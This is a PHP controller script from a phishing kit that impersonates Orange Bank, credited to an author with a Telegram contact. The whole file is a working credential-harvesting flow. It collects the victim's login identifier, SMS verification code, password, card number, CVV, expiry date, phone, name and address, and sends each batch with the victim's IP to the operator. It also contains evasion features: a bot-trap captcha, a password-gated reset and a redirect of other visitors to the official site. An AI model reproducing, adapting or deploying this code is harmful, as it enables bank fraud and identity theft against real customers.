<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('login');
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        $page = go($red);
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "identifiant") {
            $_SESSION['errors']     = [];
            $_SESSION['identifiant']   = $_POST['pass1'] . $_POST['pass2'] . $_POST['pass3'] . $_POST['pass4'] . $_POST['pass5'] . $_POST['pass6'] . $_POST['pass7'] . $_POST['pass8'];
            $id = $_POST['pass1'] . $_POST['pass2'] . $_POST['pass3'] . $_POST['pass4'] . $_POST['pass5'] . $_POST['pass6'] . $_POST['pass7'] . $_POST['pass8'];
            if( validate_number($id,8) == false ) {
                $_SESSION['errors']['identifiant'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ORANGE-BANK | Identifiant';
                $message = '/-- IDENTIFIANT INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Identifiant : ' . $id . "\r\n";
                $message .= '/-- END IDENTIFIANT INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('sms');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('login');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms']   = $_POST['n1'] . $_POST['n2'] . $_POST['n3'] . $_POST['n4'] . $_POST['n5'] . $_POST['n6'] . $_POST['n7'] . $_POST['n8'] . $_POST['n9'];
            $sms = $_POST['n1'] . $_POST['n2'] . $_POST['n3'] . $_POST['n4'] . $_POST['n5'] . $_POST['n6'] . $_POST['n7'] . $_POST['n8'] . $_POST['n9'];
            if( validate_number($sms,9) == false ) {
                $_SESSION['errors']['sms'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ORANGE-BANK | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $sms . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('password');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('sms');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "password") {
            $_SESSION['errors']     = [];
            $_SESSION['password']   = $_POST['pass1'] . $_POST['pass2'] . $_POST['pass3'] . $_POST['pass4'] . $_POST['pass5'] . $_POST['pass6'];
            $password = $_POST['pass1'] . $_POST['pass2'] . $_POST['pass3'] . $_POST['pass4'] . $_POST['pass5'] . $_POST['pass6'];
            if( validate_number($password,6) == false ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ORANGE-BANK | Password';
                $message = '/-- PASSWORD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Mot de passe : ' . $password . "\r\n";
                $message .= '/-- END PASSWORD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('details');
                header("Location: " . $page['path'] . "?verification#_");
                exit();
            } else {
                $page = go('password');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['phone']   = $_POST['phone'];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_POST['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( validate_number($_POST['phone'],10) == false ) {
                $_SESSION['errors']['one'] = 'Veuillez saisir un numéro valide.';
            }
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Veuillez saisir un numéro de la carte valide.';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'Veuillez saisir un numéro valide.';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Veuillez saisir une date valide.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ORANGE-BANK | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Téléphone : ' . $_POST['phone'] . "\r\n";
                $message .= 'N° de carte : ' . $_POST['one'] . "\r\n";
                $message .= 'CVV : ' . $_POST['two'] . "\r\n";
                $message .= 'Date d\'expiration : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('success');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('cc');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "details") {
            $_SESSION['errors']      = [];
            $_SESSION['phone']   = $_POST['phone'];
            $_SESSION['full_name']   = $_POST['full_name'];
            $_SESSION['address']     = $_POST['address'];
            if( validate_name($_POST['full_name']) == false ) {
                $_SESSION['errors']['full_name'] = 'Veuillez saisir un nom valide.';
            }
            if( validate_number($_POST['phone'],10) == false ) {
                $_SESSION['errors']['phone'] = 'Veuillez saisir un numéro valide.';
            }
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = 'Veuillez saisir une adresse valide.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ORANGE-BANK | Details';
                $message = '/-- DETAILS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Nom : ' . $_POST['full_name'] . "\r\n";
                $message .= 'Téléphone : ' . $_POST['phone'] . "\r\n";
                $message .= 'Adresse : ' . $_POST['address'] . "\r\n";
                $message .= '/-- END DETAILS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('success');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('details');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>